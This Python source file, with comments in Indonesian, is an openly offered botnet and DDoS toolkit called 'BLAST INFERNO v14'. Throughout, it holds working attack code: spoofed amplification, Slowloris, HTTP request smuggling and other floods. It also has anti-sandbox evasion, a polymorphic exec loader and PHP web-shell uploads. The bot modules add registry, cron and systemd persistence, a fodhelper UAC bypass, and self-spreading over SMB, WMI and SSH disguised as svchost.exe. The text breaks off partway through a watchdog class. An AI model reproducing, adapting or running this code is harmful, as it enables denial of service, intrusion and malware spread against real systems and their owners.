#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              BLAST INFERNO v14 — OPERATOR COMMAND CENTER                     ║
║                                                                              ║
║  LO SEBAGAI OPERATOR — AMAN 100% — GAK KENA SELF-INFECTION                  ║
║                                                                              ║
║  FITUR:                                                                      ║
║  🔴 DDoS: JA3 | GREASE | HPACK | TCP Spoof | DoH | TOR | Amplification      ║
║  🔴 DDoS: Slowloris | GraphQL | Brotli | Smuggling | WebSocket              ║
║  🔴 EVASION: Anti-VM | Sleep Obfuscation | Polymorphic | False Flag         ║
║  🔴 C2: Firebase E2EE + Pastebin Backup                                     ║
║  🔴 BOTNET: Webcam | SMS OTP | Remote Shell | Data Exfil | Kill Switch      ║
║  🔴 SPREAD: Windows SMB/WMI + Linux SSH | Persistence | UAC | Watchdog      ║
║                                                                              ║
║  USAGE:                                                                      ║
║  python3 blast_inferno.py operator [OPTIONS]   → Panel Operator (AMAN)       ║
║  python3 blast_inferno.py bot [OPTIONS]        → Payload Bot (buat target)   ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio, aiohttp, socket, struct, random, time, ssl, json, hashlib
import ipaddress, concurrent.futures, threading, logging, sys, os, signal
import base64, re, secrets, subprocess, math, hmac, platform, ctypes
from typing import List, Dict, Tuple, Optional, Set, Any, Callable, Union
from dataclasses import dataclass, field
from collections import defaultdict
from urllib.parse import urlparse, urlencode, quote
from contextlib import suppress
from functools import partial, lru_cache
from pathlib import Path
from datetime import datetime
import textwrap

# Platform
IS_WINDOWS = sys.platform == "win32"
IS_LINUX = sys.platform.startswith("linux")

if IS_LINUX: import resource
if IS_WINDOWS:
    try: import winreg
    except: pass

# Silent logging
logging.basicConfig(level=logging.CRITICAL, filename='/dev/null' if not IS_WINDOWS else 'NUL', filemode='w')
for name in logging.root.manager.loggerDict: logging.getLogger(name).setLevel(logging.CRITICAL)

# Optional imports
HAS_CRYPTO, HAS_BROTLI, HAS_SCAPY, HAS_PLAYWRIGHT, HAS_PARAMIKO = False, False, False, False, False
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC; from cryptography.hazmat.primitives import hashes; from cryptography.hazmat.backends import default_backend; HAS_CRYPTO = True
except: pass
try: import brotli; HAS_BROTLI = True
except: pass
try: from scapy.all import IP as ScapyIP, TCP as ScapyTCP, UDP as ScapyUDP, send; HAS_SCAPY = True
except: pass
try: from playwright.async_api import async_playwright; HAS_PLAYWRIGHT = True
except: pass
try: import paramiko; HAS_PARAMIKO = True
except: pass


# ═══════════════════════════════════════════════════════════════════════════
# UTILITY
# ═══════════════════════════════════════════════════════════════════════════

class AtomicCounter:
    def __init__(self, i=0): self._v = i; self._l = threading.Lock()
    def inc(self, d=1):
        with self._l: self._v += d; return self._v
    @property
    def v(self):
        with self._l: return self._v

class ShutdownSignal:
    def __init__(self): self._e = None
    def init(self):
        if self._e is None: self._e = asyncio.Event()
    @property
    def e(self): return self._e
    def set(self):
        if self._e: self._e.set()
    def is_set(self): return self._e.is_set() if self._e else False

SHUTDOWN = ShutdownSignal()

def get_self_path() -> str:
    if getattr(sys, 'frozen', False): return sys.executable
    return os.path.abspath(__file__)

def payload_self_base64() -> str:
    try:
        with open(get_self_path(), 'rb') as f: return base64.b64encode(f.read()).decode()
    except: return ""


# ═══════════════════════════════════════════════════════════════════════════
# E2EE CRYPTO
# ═══════════════════════════════════════════════════════════════════════════

class E2EECrypto:
    SALT = b"oblivion_v14_salt"
    def __init__(self, password: str):
        self.password = password
        self.master_key = self._derive_key(password)
        self._hmac_key = hashlib.sha256(self.master_key + b"hmac_key").digest()
    
    def _derive_key(self, password: str) -> bytes:
        if HAS_CRYPTO:
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=self.SALT, iterations=200000, backend=default_backend())
            return kdf.derive(password.encode())
        key = hashlib.sha256(password.encode() + self.SALT).digest()
        for _ in range(10000): key = hashlib.sha256(key + self.SALT).digest()
        return key
    
    def encrypt(self, plaintext: Union[str, bytes, Dict]) -> Dict[str, Any]:
        if isinstance(plaintext, dict): plaintext = json.dumps(plaintext, sort_keys=True).encode()
        elif isinstance(plaintext, str): plaintext = plaintext.encode()
        if HAS_CRYPTO:
            nonce = os.urandom(12); aesgcm = AESGCM(self.master_key)
            ciphertext = aesgcm.encrypt(nonce, plaintext, None)
            encrypted = nonce + ciphertext
        else:
            nonce = os.urandom(16); ks = self._xor_expand(nonce, len(plaintext))
            encrypted = nonce + bytes([p ^ k for p, k in zip(plaintext, ks)])
        mac = hmac.new(self._hmac_key, encrypted, hashlib.sha256).hexdigest()
        return {"v":1,"data":base64.b64encode(encrypted).decode(),"hmac":mac}
    
    def decrypt(self, envelope: Dict[str, Any]) -> Optional[bytes]:
        if not envelope or "data" not in envelope: return None
        try:
            encrypted = base64.b64decode(envelope["data"])
            if not hmac.compare_digest(envelope.get("hmac",""), hmac.new(self._hmac_key, encrypted, hashlib.sha256).hexdigest()): return None
            if HAS_CRYPTO:
                return AESGCM(self.master_key).decrypt(encrypted[:12], encrypted[12:], None)
            nonce = encrypted[:16]; ks = self._xor_expand(nonce, len(encrypted)-16)
            return bytes([c ^ k for c, k in zip(encrypted[16:], ks)])
        except: return None
    
    def decrypt_json(self, envelope: Dict[str, Any]) -> Optional[Dict]:
        p = self.decrypt(envelope)
        return json.loads(p.decode()) if p else None
    
    def _xor_expand(self, nonce: bytes, length: int) -> bytes:
        r = b""; c = 0
        while len(r) < length: r += hashlib.sha256(self.master_key + nonce + c.to_bytes(4,'big')).digest(); c += 1
        return r[:length]


# ═══════════════════════════════════════════════════════════════════════════
# ANTI-VM / ANTI-SANDBOX (buat bot payload)
# ═══════════════════════════════════════════════════════════════════════════

class AntiSandbox:
    VM_INDICATORS = ["vbox","vmware","virtual","qemu","xen","sandbox","cuckoo","virus","malware","analysis"]
    VM_MACS = ["00:05:69","00:0C:29","00:1C:14","00:50:56","08:00:27","00:15:5D","00:16:3E"]
    
    @classmethod
    def is_vm(cls) -> bool:
        score = 0
        try:
            mem = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') if hasattr(os, 'sysconf') else 8*1024**3
            if mem < 4*1024**3: score += 3
        except: pass
        if (os.cpu_count() or 1) < 2: score += 2
        hostname = socket.gethostname().lower()
        for h in cls.VM_INDICATORS:
            if h in hostname: score += 4; break
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode()>>e)&0xff) for e in range(0,2*6,2)][::-1])
            for vm_mac in cls.VM_MACS:
                if mac.startswith(vm_mac): score += 3; break
        except: pass
        if sys.gettrace() is not None: score += 5
        return score >= 5
    
    @classmethod
    def check_and_evade(cls):
        if cls.is_vm(): time.sleep(999999); sys.exit(0)


# ═══════════════════════════════════════════════════════════════════════════
# SLEEP OBFUSCATION (buat bot payload)
# ═══════════════════════════════════════════════════════════════════════════

class SleepObfuscation:
    @staticmethod
    def evade_sandbox():
        try:
            with open("/proc/uptime") as f: uptime = float(f.readline().split()[0])
        except: uptime = 999999
        if uptime < 1800: time.sleep(random.randint(600, 900))
        elif 8 <= datetime.now().hour <= 18 and random.random() < 0.3: time.sleep(random.randint(300, 600))


# ═══════════════════════════════════════════════════════════════════════════
# POLYMORPHIC ENGINE
# ═══════════════════════════════════════════════════════════════════════════

class PolymorphicEngine:
    @classmethod
    def generate_variant(cls) -> str:
        original = payload_self_base64()
        if not original: return ""
        key = random.randint(1,255)
        xored = bytes([b ^ key for b in base64.b64decode(original)])
        encoded = base64.b64encode(xored).decode()
        stub = f'''import base64; _k={key}; _d="{encoded}"; exec(bytes([b^_k for b in base64.b64decode(_d)]))'''
        return base64.b64encode(stub.encode()).decode()


# ═══════════════════════════════════════════════════════════════════════════
# JA3 / TLS FINGERPRINT ROTATION
# ═══════════════════════════════════════════════════════════════════════════

class TLSFingerprintRotator:
    CHROME = {"tls_version":771,"ciphers":[4865,4866,4867,49195,49199,49196,49200,52393,52392,49171,49172,156,157,47,53],"extensions":[0,5,10,11,13,16,18,23,27,28,35,41,43,45,51,17513,65037],"groups":[29,23,24]}
    FIREFOX = {"tls_version":771,"ciphers":[4865,4867,4866,49195,49199,52393,52392,49196,49200,49162,49161,49171,49172,156,157,47,53],"extensions":[0,5,10,11,13,16,18,23,27,28,35,41,43,45,51,17513,65037,0],"groups":[29,23,24,25,256,257]}
    SAFARI = {"tls_version":771,"ciphers":[4865,4866,4867,49195,49199,49196,49200,52393,52392,49171,49172,156,157,47,53],"extensions":[0,5,10,11,13,16,18,23,27,28,35,41,43,45,51],"groups":[29,23,24]}
    GREASE = [2570,6682,10794,14906,19018,23130,27242,31354]
    
    @classmethod
    def generate_ja3(cls, profile: Dict = None) -> Dict:
        if profile is None: profile = random.choice([cls.CHROME, cls.FIREFOX, cls.SAFARI])
        c = profile["ciphers"].copy(); e = profile["extensions"].copy(); g = profile["groups"].copy()
        if random.random() < 0.7: c.insert(random.randint(1,len(c)), random.choice(cls.GREASE))
        if random.random() < 0.7: e.insert(random.randint(1,len(e)), random.choice(cls.GREASE))
        ja3 = f"{profile['tls_version']},{'-'.join(str(x) for x in c)},{'-'.join(str(x) for x in e)},{'-'.join(str(x) for x in g)},0"
        return {"ja3":ja3,"ja4":hashlib.md5(ja3.encode()).hexdigest()[:12]}
    
    @classmethod
    @lru_cache(maxsize=100)
    def generate_pool(cls, size=50) -> List[Dict]: return [cls.generate_ja3() for _ in range(size)]
    
    @classmethod
    def create_ssl_context(cls, fp: Dict = None) -> ssl.SSLContext:
        if fp is None: fp = cls.generate_ja3()
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        ctx.options |= ssl.OP_NO_COMPRESSION | ssl.OP_NO_TICKET | ssl.OP_NO_RENEGOTIATION
        try: ctx.set_ciphers(":".join(fp["ja3"].split(",")[1].split("-")[:8]))
        except: pass
        try: ctx.set_session_id(os.urandom(32))
        except: pass
        return ctx


# ═══════════════════════════════════════════════════════════════════════════
# HPACK + USER AGENT + REFERER + PATH + COOKIE
# ═══════════════════════════════════════════════════════════════════════════

class HPACKRandomizer:
    NOISE = ["x-client-data","x-requested-with","cf-ray","x-request-id","x-correlation-id"]
    @classmethod
    def randomize(cls, h: Dict) -> Dict:
        for _ in range(random.randint(0,3)):
            n = random.choice(cls.NOISE)
            if n not in h: h[n] = secrets.token_hex(random.randint(4,16))
        items = list(h.items()); random.shuffle(items); return dict(items)
    @classmethod
    def padding(cls) -> List[Tuple[str,str]]:
        return [(f"x-{secrets.token_hex(3)}",secrets.token_hex(6)) for _ in range(random.randint(0,3))]

class UserAgentEngine:
    PROFILES = [
        {"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","country":"US"},
        {"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","country":"RU"},
        {"ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15","country":"CN"},
        {"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.51","country":"KP"},
    ]
    @classmethod
    def get_ua(cls) -> str: return random.choice([p["ua"] for p in cls.PROFILES])
    @classmethod
    def get_false_flag_ua(cls, country="CN") -> str:
        for p in cls.PROFILES:
            if p["country"] == country: return p["ua"]
        return cls.PROFILES[0]["ua"]
    @classmethod
    def get_headers(cls) -> Dict:
        p = random.choice(cls.PROFILES)
        return {"User-Agent":p["ua"],"Sec-Ch-Ua-Platform":'"Windows"' if "Windows" in p["ua"] else '"Linux"' if "Linux" in p["ua"] else '"macOS"'}

class RefererChainSpoofer:
    ENGINES = ["https://www.google.com/search?q={q}","https://www.bing.com/search?q={q}","https://yandex.ru/search/?text={q}","https://www.baidu.com/s?wd={q}"]
    QUERIES = ["online+shopping","discount+code","how+to","tutorial","review","cheap"]
    @classmethod
    def generate(cls, domain: str) -> List[str]:
        chain = [random.choice(cls.ENGINES).format(q=random.choice(cls.QUERIES))]
        for _ in range(random.randint(1,3)): chain.append(f"https://{domain}/page/{random.randint(1,999)}")
        return chain
    @classmethod
    def get_referer(cls, chain: List[str], i: int) -> str:
        return chain[i-1] if 0 < i < len(chain) else ""

class PathRandomizer:
    PATHS = ["/","/index.html","/home","/about","/products","/blog","/search","/login","/api/v1/users","/api/v1/products"]
    @classmethod
    def get(cls) -> str:
        p = random.choice(cls.PATHS)
        if random.random() < 0.5: p += "?" + urlencode({secrets.token_hex(4):secrets.token_hex(6)})
        return p

class CookieSessionManager:
    def __init__(self): self._s = defaultdict(dict); self._c = defaultdict(int); self._l = threading.Lock()
    def get(self, d: str) -> Dict:
        with self._l: return self._s[d].copy()
    def set(self, d: str, c: Dict):
        with self._l: self._s[d].update(c)
    def should_rotate(self, d: str, mx=50) -> bool:
        with self._l: self._c[d] += 1; return self._c[d] >= mx
    def rotate(self, d: str):
        with self._l: self._s[d] = {}; self._c[d] = 0
    def header(self, d: str) -> str:
        return "; ".join(f"{k}={v}" for k,v in self.get(d).items())


# ═══════════════════════════════════════════════════════════════════════════
# DoH + TCP SPOOF + TOR
# ═══════════════════════════════════════════════════════════════════════════

class DoHResolver:
    PROVIDERS = ["https://cloudflare-dns.com/dns-query","https://dns.google/dns-query","https://dns.quad9.net/dns-query"]
    @classmethod
    async def resolve(cls, domain: str) -> Optional[str]:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(random.choice(cls.PROVIDERS), params={"name":domain,"type":"A"}, headers={"accept":"application/dns-json"}, timeout=10) as r:
                    if r.status == 200:
                        for a in (await r.json()).get("Answer",[]):
                            if a.get("type") in (1,28): return a["data"]
        except: pass
        return None

class TCPStackSpoofer:
    @classmethod
    def randomize(cls):
        try:
            for p,v in [("/proc/sys/net/ipv4/ip_default_ttl",str(random.choice([64,128])))]:
                if os.path.exists(p):
                    with open(p,"w") as f: f.write(v)
        except: pass

class MultiHopProxyChain:
    def __init__(self): self.ready = False
    def start(self):
        subprocess.run("systemctl start tor 2>/dev/null || tor --quiet &", shell=True); time.sleep(3)
        try: s=socket.socket(); s.settimeout(5); s.connect(("127.0.0.1",9050)); s.close(); self.ready=True
        except: self.ready=False
    def get(self) -> Optional[str]: return "socks5://127.0.0.1:9050" if self.ready else None


# ═══════════════════════════════════════════════════════════════════════════
# AMPLIFICATION SPOOFING
# ═══════════════════════════════════════════════════════════════════════════

class AmplificationSpoofer:
    PROTO = {"memcached":{"port":11211,"payload":b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n","amp":51200},"ntp":{"port":123,"payload":b"\x17\x00\x03\x2a"+b"\x00"*44,"amp":556},"dns":{"port":53,"amp":54}}
    def __init__(self, tip: str): self.tip = tip; self.pkts = AtomicCounter(); self.bytes = AtomicCounter()
    def _sip(self) -> str:
        while True:
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if not ipaddress.ip_address(ip).is_private: return ip
    def _build(self, src: str, dst: str, sp: int, dp: int, pl: bytes) -> bytes:
        ih = struct.pack('!BBHHHBBH4s4s',0x45,0,20+8+len(pl),random.randint(1,65535),0,random.randint(64,128),17,0,socket.inet_aton(src),socket.inet_aton(dst))
        return ih + struct.pack('!HHHH',sp,dp,8+len(pl),0) + pl
    def _send(self, rfl: str, proto: str, raw):
        try: host, port = rfl.split(":",1); port=int(port)
        except: host=rfl; port=self.PROTO[proto]["port"]
        if proto=="dns":
            tid=random.randint(1,65535); pl=struct.pack(">HHHHHH",tid,0x0120,1,0,0,0)
            for p in "google.com".split("."): pl+=bytes([len(p)])+p.encode()
            pl+=b"\x00"+struct.pack(">HH",255,1)
        else: pl=self.PROTO[proto].get("payload",b"\x00"*32)
        raw.sendto(self._build(self._sip(),host,random.randint(1024,65535),port,pl),(host,0))
        self.pkts.inc(); self.bytes.inc(len(pl)*self.PROTO[proto]["amp"])
    async def launch(self, rfls: List[str], proto: str, dur: int):
        try: raw=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW); raw.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
        except: return
        end=time.time()+dur; loop=asyncio.get_running_loop()
        def w(refs):
            while time.time()<end and not SHUTDOWN.is_set():
                for r in refs: self._send(r,proto,raw); time.sleep(0.0001)
        with concurrent.futures.ThreadPoolExecutor(50) as pool:
            await asyncio.gather(*[loop.run_in_executor(pool,w,[r]) for r in rfls[:50]],return_exceptions=True)
        raw.close()


# ═══════════════════════════════════════════════════════════════════════════
# SLOWLORIS + GRAPHQL + BROTLI + SMUGGLING + WEBSOCKET + MALWARE INJECT
# ═══════════════════════════════════════════════════════════════════════════

class SlowlorisEngine:
    def __init__(self, url: str):
        p=urlparse(url); self.h=p.hostname; self.port=p.port or (443 if p.scheme=="https" else 80); self.tls=p.scheme=="https"
    async def worker(self, _: int):
        while not SHUTDOWN.is_set():
            try:
                s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.settimeout(30)
                if self.tls: s=TLSFingerprintRotator.create_ssl_context().wrap_socket(s,server_hostname=self.h)
                s.connect((self.h,self.port))
                for h in [f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {self.h}\r\nUser-Agent: {UserAgentEngine.get_ua()}\r\nConnection: keep-alive\r\n"]:
                    s.send(h.encode()); await asyncio.sleep(random.uniform(5,15))
                for _ in range(random.randint(10,30)):
                    if SHUTDOWN.is_set(): break
                    await asyncio.sleep(random.uniform(10,30))
                    try: s.send(f"X-Keep-Alive: {os.urandom(4).hex()}\r\n".encode())
                    except: break
                s.close()
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)

class GraphQLAbuser:
    Q = ['query { user { posts { comments { user { posts { comments { text } } } } } } }','query { '+ ' '.join([f'a{i}: __typename' for i in range(50)])+' }']
    @classmethod
    async def abuse(cls, url: str, proxy=None, mal=None):
        try:
            async with aiohttp.ClientSession() as s:
                h=UserAgentEngine.get_headers(); h["Content-Type"]="application/json"
                if mal: h["X-Payload"]=mal
                async with s.post(f"{url.rstrip('/')}/graphql",json={"query":random.choice(cls.Q)},headers=h,proxy=proxy,ssl=TLSFingerprintRotator.create_ssl_context(),timeout=30) as r: await r.read()
        except: pass

class BrotliBomber:
    @classmethod
    async def bomb(cls, url: str, proxy=None, mal=None):
        if not HAS_BROTLI: return
        d=brotli.compress(b"A"*(10*1024*1024),quality=11)
        h=UserAgentEngine.get_headers(); h.update({"Content-Encoding":"br","Content-Type":"application/octet-stream"})
        if mal: h["X-Payload"]=mal
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(url,data=d,headers=h,proxy=proxy,ssl=TLSFingerprintRotator.create_ssl_context(),timeout=30) as r: await r.read()
        except: pass

class RequestSmuggler:
    @classmethod
    async def smuggle(cls, host: str, port: int, tls: bool):
        pl=f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\nx".encode()
        s=socket.socket(); s.settimeout(10)
        if tls: s=TLSFingerprintRotator.create_ssl_context().wrap_socket(s,server_hostname=host)
        s.connect((host,port)); s.send(pl)
        try: s.recv(4096)
        except: pass
        s.close()

class WebSocketFlooder:
    @classmethod
    async def flood(cls, url: str, proxy=None, mal=None):
        try:
            async with aiohttp.ClientSession() as s:
                h=UserAgentEngine.get_headers()
                if mal: h["X-Payload"]=mal
                async with s.ws_connect(f"{url.rstrip('/')}/ws",headers=h,proxy=proxy,ssl=TLSFingerprintRotator.create_ssl_context(),timeout=10) as ws:
                    for _ in range(random.randint(20,100)): await ws.send_str(secrets.token_hex(random.randint(64,2048))); await asyncio.sleep(0.005)
        except: pass

class EncryptedMalwareInjector:
    INJ_HEADERS = ["X-Payload","X-Forwarded-For","X-Real-IP","Cookie","Referer","Origin","Authorization"]
    UPLOAD = ["/upload","/wp-admin/upload.php","/api/upload","/file/upload"]
    FORMS = ["/login","/register","/signup","/contact","/search","/wp-login.php"]
    
    @classmethod
    def encrypt_payload(cls, b64: str) -> str:
        nonce=os.urandom(12)
        if HAS_CRYPTO: return base64.b64encode(nonce+AESGCM(hashlib.sha256(b"malware_key").digest()).encrypt(nonce,b64.encode(),None)).decode()
        return base64.b64encode(nonce+bytes([b^k for b,k in zip(b64.encode(),hashlib.sha256(b"mk"+nonce).digest()*(len(b64)//32+1))])).decode()
    
    @classmethod
    def build_headers(cls, h: Dict, b64: str) -> Dict:
        enc=cls.encrypt_payload(b64); nh=h.copy()
        if random.random()<0.4: nh[random.choice(cls.INJ_HEADERS)]=enc[:random.randint(100,500)]
        return nh
    
    @classmethod
    async def inject_upload(cls, url: str, b64: str, proxy=None):
        enc=cls.encrypt_payload(b64)
        boundary=f"----WebKitFormBoundary{secrets.token_hex(16)}"
        body=f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{secrets.token_hex(6)}.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php eval(base64_decode('{enc[:200]}')); ?>\r\n--{boundary}--\r\n"
        try:
            async with aiohttp.ClientSession() as s:
                h=UserAgentEngine.get_headers(); h["Content-Type"]=f"multipart/form-data; boundary={boundary}"
                async with s.post(f"{url.rstrip('/')}{random.choice(cls.UPLOAD)}",data=body.encode(),headers=h,proxy=proxy,ssl=TLSFingerprintRotator.create_ssl_context(),timeout=15) as r: await r.read()
        except: pass


# ═══════════════════════════════════════════════════════════════════════════
# LAYER 7 ENGINE (Full Anti-Forensic + Traffic Morphing + Malware Injection)
# ═══════════════════════════════════════════════════════════════════════════

class Layer7Engine:
    def __init__(self, config: 'ThermalConfig'):
        self.cfg=config; self.fps=TLSFingerprintRotator.generate_pool(50)
        self.cookies=CookieSessionManager(); self.proxy_chain=MultiHopProxyChain()
        self.paths=[PathRandomizer.get() for _ in range(30)]
        self.req=AtomicCounter(); self.succ=AtomicCounter(); self.err=AtomicCounter(); self.mal=AtomicCounter()
        self.mal_b64=""
    
    def load_payload(self): self.mal_b64=PolymorphicEngine.generate_variant() or payload_self_base64()
    def _proxy(self) -> Optional[str]:
        if not self.cfg.proxy_list: return self.proxy_chain.get()
        return random.choice(self.cfg.proxy_list)
    
    def _headers(self, ref_chain=None, ci=0) -> Dict:
        h=UserAgentEngine.get_headers()
        h.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate, br","Cache-Control":"no-cache","Connection":"keep-alive"})
        if ref_chain and ci>0: h["Referer"]=RefererChainSpoofer.get_referer(ref_chain,ci)
        domain=urlparse(self.cfg.target_url).hostname
        cookies=self.cookies.get(domain)
        if cookies: h["Cookie"]=self.cookies.header(domain)
        for n,v in HPACKRandomizer.padding():
            if n not in h: h[n]=v
        return HPACKRandomizer.randomize(h)
    
    async def http_worker(self, wid: int):
        p=urlparse(self.cfg.target_url); base=f"{p.scheme}://{p.netloc}"; domain=p.hostname
        ref_chain=RefererChainSpoofer.generate(domain); ci=0
        fi=0; proxy=self._proxy(); lr=0
        while not SHUTDOWN.is_set():
            try:
                if self.req.v-lr>=self.cfg.ja4_interval: fi=(fi+1)%len(self.fps); lr=self.req.v
                fp=self.fps[fi]; ssl_ctx=TLSFingerprintRotator.create_ssl_context(fp)
                if self.req.v%self.cfg.proxy_interval==0: proxy=self._proxy()
                if self.cookies.should_rotate(domain,50): self.cookies.rotate(domain)
                url=f"{base}{random.choice(self.paths)}"
                h=self._headers(ref_chain,ci); ci=(ci+1)%len(ref_chain)
                if self.mal_b64 and random.random()<0.3: h=EncryptedMalwareInjector.build_headers(h,self.mal_b64); self.mal.inc()
                if random.random()<0.1: h["User-Agent"]=UserAgentEngine.get_false_flag_ua(random.choice(["RU","CN","KP"]))
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15,connect=5),headers=h) as s:
                    m=random.choice(["GET","GET","GET","GET","HEAD","POST"])
                    if m=="POST":
                        d={f"f_{secrets.token_hex(3)}":secrets.token_hex(8)}
                        async with s.post(url,data=d,proxy=proxy,ssl=ssl_ctx) as r: self._cookies(r,domain)
                    else:
                        async with s.get(url,proxy=proxy,ssl=ssl_ctx) as r: self._cookies(r,domain)
                self.req.inc(); self.succ.inc()
                await asyncio.sleep(random.uniform(0.001,0.05))
            except asyncio.CancelledError: break
            except: self.err.inc(); await asyncio.sleep(0.1)
    
    def _cookies(self, r, d: str):
        try:
            c={k:v.value for k,v in r.cookies.items()}
            if c: self.cookies.set(d,c)
        except: pass


# ═══════════════════════════════════════════════════════════════════════════
# BOT PAYLOAD MODULES (jalan di TARGET, bukan di operator)
# ═══════════════════════════════════════════════════════════════════════════

class BotPersistence:
    @staticmethod
    def _cmd(c): 
        try: return subprocess.run(c,shell=True,capture_output=True,timeout=10).returncode==0
        except: return False
    @classmethod
    def install(cls, exe: str) -> Dict:
        r={}
        if IS_WINDOWS:
            r["reg"]=cls._cmd(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinSvc /t REG_SZ /d "{exe}" /f')
            r["task"]=cls._cmd(f'schtasks /create /tn "WinSvc" /tr "{exe}" /sc hourly /mo 1 /ru SYSTEM /rl HIGHEST /f')
        else:
            r["cron"]=cls._cmd(f'(crontab -l 2>/dev/null; echo "@reboot {exe} > /dev/null 2>&1") | crontab -')
            try:
                svc=f"[Unit]\nDescription=SysUpdate\nAfter=network.target\n[Service]\nType=forking\nExecStart={exe}\nRestart=always\n[Install]\nWantedBy=multi-user.target"
                with open("/etc/systemd/system/sysupdate.service","w") as f: f.write(svc)
                cls._cmd("systemctl daemon-reload && systemctl enable sysupdate && systemctl start sysupdate"); r["systemd"]=True
            except: r["systemd"]=False
        return r

class BotUAC:
    @staticmethod
    def _cmd(c): 
        try: return subprocess.run(c,shell=True,capture_output=True,timeout=15).returncode==0
        except: return False
    @classmethod
    def bypass(cls, exe: str) -> bool:
        if not IS_WINDOWS: return False
        for c in [f'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /f /ve /d "{exe}"',f'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /f /v DelegateExecute /d ""','fodhelper.exe','timeout /t 5 /nobreak > nul','reg delete "HKCU\\Software\\Classes\\ms-settings" /f']: cls._cmd(c); time.sleep(0.5)
        return True

class BotLateral:
    @staticmethod
    async def scan(subnet=None) -> List[str]:
        if not subnet:
            try: subnet=".".join(socket.gethostbyname(socket.gethostname()).split(".")[:3])
            except: return []
        try:
            r=subprocess.run(f"for i in {{1..254}}; do (ping -c 1 -W 1 {subnet}.$i > /dev/null 2>&1 && echo {subnet}.$i &); done; wait",shell=True,capture_output=True,timeout=60)
            return r.stdout.decode().strip().split('\n') if r.returncode==0 else []
        except: return []
    
    @staticmethod
    def smb_spread(target_ip: str, user: str, pw: str) -> bool:
        if not IS_WINDOWS: return False
        sp=get_self_path()
        return subprocess.run(f'net use \\\\{target_ip}\\ADMIN$ /user:{user} {pw} 2>nul && copy /Y "{sp}" \\\\{target_ip}\\ADMIN$\\Temp\\svchost.exe 2>nul',shell=True,capture_output=True,timeout=15).returncode==0
    
    @staticmethod
    def wmi_exec(target_ip: str, user: str, pw: str) -> bool:
        if not IS_WINDOWS: return False
        return subprocess.run(f'wmic /node:"{target_ip}" /user:"{user}" /password:"{pw}" process call create "cmd.exe /c C:\\Windows\\Temp\\svchost.exe"',shell=True,capture_output=True,timeout=20).returncode==0
    
    @staticmethod
    def ssh_spread(target_ip: str, user: str, pw: str) -> bool:
        sp=get_self_path(); rp="/tmp/.sysupdate"
        if HAS_PARAMIKO:
            try:
                ssh=paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip,username=user,password=pw,timeout=10)
                sftp=ssh.open_sftp(); sftp.put(sp,rp); sftp.close()
                ssh.exec_command(f"chmod +x {rp} && nohup {rp} > /dev/null 2>&1 &"); ssh.close(); return True
            except: pass
        else:
            try:
                subprocess.run(f'sshpass -p "{pw}" scp -o StrictHostKeyChecking=no {sp} {user}@{target_ip}:{rp}',shell=True,capture_output=True,timeout=15)
                subprocess.run(f'sshpass -p "{pw}" ssh -o StrictHostKeyChecking=no {user}@{target_ip} "chmod +x {rp} && nohup {rp} > /dev/null 2>&1 &"',shell=True,capture_output=True,timeout=15)
                return True
            except: pass
        return False
    
    @classmethod
    async def spread(cls, creds: List[Dict], subnet=None) -> List[Dict]:
        hosts=await cls.scan(subnet); results=[]
        for h in hosts:
            for c in creds:
                if IS_WINDOWS:
                    if cls.smb_spread(h,c.get("username",""),c.get("password","")):
                        if cls.wmi_exec(h,c.get("username",""),c.get("password","")): results.append({"host":h,"status":"infected"})
                else:
                    if cls.ssh_spread(h,c.get("username",""),c.get("password","")): results.append({"host":h,"status":"infected"})
        return results

class BotWatchdog:
    def __init__(self, exe): self.exe=exe
    def start(self):
        if IS_WINDOWS:
            vbs=f'Set wmi=GetObject("winmgmts:{{impersonationLevel=impersonate}}!\\\\.\\root\\cimv2")\nDo\nWScript.Sleep 5000\nSet p=wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name=\\"{os.path.basename(self.exe)}\\"")\nIf p.Count=0 Then CreateObject("WScript.Shell").Run """"{self.exe}"""",0,False\nEnd If\nLoop'
            try:
